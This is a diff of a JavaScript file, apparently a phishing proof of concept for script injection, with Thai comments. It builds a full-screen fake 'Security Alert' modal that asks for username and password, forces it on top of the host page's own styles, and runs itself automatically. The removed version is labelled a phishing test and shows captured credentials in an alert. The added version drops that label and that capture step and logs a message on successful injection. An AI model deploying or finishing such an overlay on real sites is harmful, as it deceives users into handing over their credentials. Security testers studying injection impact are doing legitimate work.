@@ -1,56 +1,48 @@
+// ปรับปรุงไฟล์ test.js ใน GitHub
 function hello() {
-    // 1. สร้าง Overlay (ฉากหลังเทา)
-    const overlay = document.createElement('div');
-    overlay.style.position = 'fixed';
-    overlay.style.top = '0';
-    overlay.style.left = '0';
-    overlay.style.width = '100%';
-    overlay.style.height = '100%';
-    overlay.style.backgroundColor = 'rgba(0,0,0,0.7)';
-    overlay.style.zIndex = '9999';
-    overlay.style.display = 'flex';
-    overlay.style.justifyContent = 'center';
-    overlay.style.alignItems = 'center';
-    overlay.style.fontFamily = 'Arial, sans-serif';
+    const createModal = () => {
+        const overlay = document.createElement('div');
+        // ใส่ !important ทุกจุดเพื่อป้องกัน CSS เว็บเดิมมาทับ
+        overlay.style.setProperty('position', 'fixed', 'important');
+        overlay.style.setProperty('top', '0', 'important');
+        overlay.style.setProperty('left', '0', 'important');
+        overlay.style.setProperty('width', '100%', 'important');
+        overlay.style.setProperty('height', '100%', 'important');
+        overlay.style.setProperty('background-color', 'rgba(0,0,0,0.8)', 'important');
+        overlay.style.setProperty('z-index', '2147483647', 'important'); // ค่า z-index สูงสุดที่เป็นไปได้
+        overlay.style.setProperty('display', 'flex', 'important');
+        overlay.style.setProperty('justify-content', 'center', 'important');
+        overlay.style.setProperty('align-items', 'center', 'important');
 
-    // 2. สร้างกล่อง Modal (หน้า Login)
-    const modal = document.createElement('div');
-    modal.style.backgroundColor = 'white';
-    modal.style.padding = '30px';
-    modal.style.borderRadius = '8px';
-    modal.style.boxShadow = '0 4px 15px rgba(0,0,0,0.3)';
-    modal.style.textAlign = 'center';
-    modal.style.width = '350px';
-    modal.style.color = 'black'; // มั่นใจว่าตัวอักษรไม่กลืนกับพื้นหลัง
+        const modal = document.createElement('div');
+        modal.style.setProperty('background-color', 'white', 'important');
+        modal.style.setProperty('padding', '30px', 'important');
+        modal.style.setProperty('border-radius', '10px', 'important');
+        modal.style.setProperty('width', '350px', 'important');
+        modal.style.setProperty('color', 'black', 'important');
+        modal.style.setProperty('text-align', 'center', 'important');
 
-    modal.innerHTML = `
-        <h2 style="color: #d9534f; margin-top: 0;">⚠️ Security Alert</h2>
-        <p>Session Expired. Please login again to continue.</p>
-        <p style="font-weight: bold; color: blue;">(POC: ทดสอบ Phishing)</p>
-        <input type="text" id="username" placeholder="Username" style="width: 90%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;">
-        <input type="password" id="password" placeholder="Password" style="width: 90%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px;">
-        <br>
-        <button id="loginBtn" style="width: 95%; padding: 10px; background-color: #0275d8; color: white; border: none; border-radius: 4px; cursor: pointer;">Login</button>
-    `;
+        modal.innerHTML = `
+            <h2 style="color:red !important;">Security Alert</h2>
+            <p>Please re-authenticate</p>
+            <input type="text" id="u" placeholder="User" style="width:90%;margin:10px;padding:5px;">
+            <input type="password" id="p" placeholder="Pass" style="width:90%;margin:10px;padding:5px;">
+            <button id="b" style="padding:10px 20px;">Login</button>
+        `;
 
-    // --- จุดสำคัญที่หายไป ---
-    overlay.appendChild(modal); 
-    // ----------------------
-
-    // ฟังก์ชันช่วยจัดการเมื่อกดปุ่ม (Optional)
-    const runPayload = () => {
+        overlay.appendChild(modal);
         document.body.appendChild(overlay);
-        document.getElementById('loginBtn').onclick = function() {
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
-            alert('POC Captured!\nUser: ' + user + '\nPass: ' + pass);
-            overlay.remove(); // ปิดหน้าต่างหลังกด
-        };
+        console.log("Modal Injected Successfully!");
     };
 
-    if (document.body) {
-        runPayload();
-    } else {
-        window.addEventListener('DOMContentLoaded', runPayload);
-    }
+    // ใช้ interval เพื่อเช็คจนกว่า body จะพร้อม
+    const checkExist = setInterval(() => {
+       if (document.body) {
+          createModal();
+          clearInterval(checkExist);
+       }
+    }, 100);
 }
+
+// เรียกใช้เองในตัวไฟล์เลย เผื่อกรณีที่ onload ใน script tag ไม่ทำงาน
+hello();
